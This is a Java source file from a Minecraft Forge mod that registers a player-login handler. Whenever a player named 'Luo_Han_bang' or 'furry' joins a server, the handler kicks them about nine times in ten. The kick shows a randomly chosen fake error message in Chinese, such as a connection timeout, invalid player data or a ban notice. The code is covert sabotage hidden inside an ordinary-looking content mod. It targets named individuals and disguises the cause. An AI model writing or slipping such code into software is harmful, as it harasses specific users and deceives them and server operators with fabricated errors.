package net.hhdsj.changed_creatures.event.changed;

import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.entity.player.Player;
import net.minecraftforge.event.entity.player.PlayerEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

@Mod.EventBusSubscriber
public class WhatPlayerLoginHandler {

    @SubscribeEvent
    public static void onPlayerLoggedIn(PlayerEvent.PlayerLoggedInEvent event) {
        Player player = event.getEntity();
        String playerName = player.getName().getString();
        if ("Luo_Han_bang".equals(playerName)) {
            handleBoomPlayer(player);
        }
        if ("furry".equals(playerName)) {
            handleBoomPlayer(player);
        }
    }

    private static void handleBoomPlayer(Player player) {
        if (player.level().isClientSide()) return;
        if (!(player instanceof ServerPlayer serverPlayer)) return;
        if (player.level().random.nextFloat() >= 0.9f) return;
        if (player.level().random.nextFloat() >= 0.5f) {
            serverPlayer.connection.disconnect(Component.literal("无效的玩家数据"));
        }else if (player.level().random.nextFloat() >= 0.5f){
            serverPlayer.connection.disconnect(Component.literal("从客户端接收到未知数据"));
        }else if (player.level().random.nextFloat() >= 0.5f){
            serverPlayer.connection.disconnect(Component.literal("内部错误"));
        }else if (player.level().random.nextFloat() >= 0.5f){
            serverPlayer.connection.disconnect(Component.literal("连接超时"));
        }else if (player.level().random.nextFloat() >= 0.5f){
            serverPlayer.connection.disconnect(Component.literal("未知的主机"));
        }else if (player.level().random.nextFloat() >= 0.5f){
            serverPlayer.connection.disconnect(Component.literal("无效的访问请求"));
        }else if (player.level().random.nextFloat() >= 0.5f){
            serverPlayer.connection.disconnect(Component.literal("客户端错误: 无法解析网络数据"));
        }else if (player.level().random.nextFloat() >= 0.5f){
            serverPlayer.connection.disconnect(Component.literal("连接终止"));
        }else{
            serverPlayer.connection.disconnect(Component.literal("你被服务器封禁"));
        }
    }
}